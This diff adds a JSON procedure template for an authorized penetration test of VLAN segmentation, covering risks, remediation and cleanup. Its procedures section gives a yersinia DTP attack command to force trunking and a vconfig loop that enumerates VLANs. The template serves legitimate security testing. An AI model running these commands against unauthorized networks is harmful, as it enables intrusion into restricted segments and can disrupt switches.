@@ -1,0 +1,118 @@
+{
+  "id": "vlan_hopping",
+  "version": "1.0.0",
+  "template_version": "1.0",
+  "name": "VLAN Hopping Attacks",
+  "workstream": "network_segregation",
+  "author": "Network Testing Team",
+  "created": "2024-01-15T00:00:00Z",
+  "modified": "2024-01-15T00:00:00Z",
+  "status": "active",
+  "description": "Exploit VLAN misconfigurations to access restricted network segments.",
+  "tags": ["vlan", "hopping", "dtp", "trunking", "segmentation"],
+  "risk_level": "high",
+
+  "overview": {
+    "purpose": "Test VLAN segmentation security by exploiting misconfigurations to access restricted network segments.",
+    "scope": "VLAN configurations, trunk ports, DTP protocols, and network segmentation within the target environment.",
+    "prerequisites": [
+      "Physical access to network infrastructure",
+      "VLAN manipulation tools",
+      "Network packet injection capabilities",
+      "Proper authorization for penetration testing"
+    ],
+    "category": "Network Access Control Testing"
+  },
+
+  "triggers": [
+    {
+      "name": "vlan_environment_detected",
+      "type": "simple",
+      "conditions": {
+        "asset_type": "networkSegment",
+        "properties": {
+          "vlan_id": {"exists": true}
+        }
+      },
+      "description": "Trigger when VLAN segmentation is detected"
+    }
+  ],
+
+  "equipment": [
+    "Network interface (Ethernet adapter)",
+    "VLAN manipulation tools",
+    "Network packet injection tools"
+  ],
+
+  "procedures": [
+    {
+      "id": "vlan_hopping",
+      "name": "VLAN Hopping Attacks",
+      "description": "Exploit VLAN misconfigurations to access restricted network segments.",
+      "risk_level": "high",
+      "risks": [
+        {
+          "risk": "DTP attacks may cause switch configuration changes",
+          "mitigation": "Document original switch configuration and test on non-production VLANs"
+        },
+        {
+          "risk": "CAM table overflow may cause network instability",
+          "mitigation": "Limit the scope of VLAN enumeration and monitor switch resources"
+        }
+      ],
+      "commands": [
+        {
+          "tool": "yersinia",
+          "command": "sudo yersinia dtp -attack 1 -interface {interface}",
+          "description": "Perform DTP attack to force trunk mode",
+          "parameters": {
+            "interface": "Network interface for DTP attack"
+          },
+          "platforms": ["linux"]
+        },
+        {
+          "tool": "vconfig",
+          "command": "for vlan in {1..100}; do sudo vconfig add {interface} $vlan 2>/dev/null; sudo ifconfig {interface}.$vlan up 2>/dev/null; done",
+          "description": "Enumerate VLANs by creating VLAN interfaces",
+          "parameters": {
+            "interface": "Network interface for VLAN enumeration"
+          },
+          "platforms": ["linux"]
+        }
+      ]
+    }
+  ],
+
+  "findings": [
+    {
+      "title": "VLAN Segmentation Weaknesses",
+      "severity": "High",
+      "description": "VLAN configurations allow unauthorized access to restricted network segments through DTP manipulation and VLAN hopping techniques.",
+      "recommendation": "Disable DTP on access ports, implement proper VLAN ACLs, review native VLAN configurations, and deploy VLAN access control lists."
+    }
+  ],
+
+  "cleanup": [
+    {
+      "step": "remove_vlan_interfaces",
+      "description": "Remove created VLAN interfaces",
+      "command": "for vlan in {1..4096}; do sudo vconfig rem {interface}.$vlan 2>/dev/null; done"
+    },
+    {
+      "step": "restore_interface",
+      "description": "Restore original interface configuration",
+      "command": "sudo ifconfig {interface} down && sudo ifconfig {interface} up"
+    }
+  ],
+
+  "troubleshooting": [
+    {
+      "issue": "VLAN interfaces fail to get IP addresses",
+      "solution": "Verify VLAN tagging is required, check if DHCP is available on target VLAN, and ensure proper VLAN interface configuration."
+    },
+    {
+      "issue": "DTP attacks not working",
+      "solution": "Check if switch supports DTP, verify interface is connected to switchport, and try different DTP attack modes."
+    }
+  ]
+}
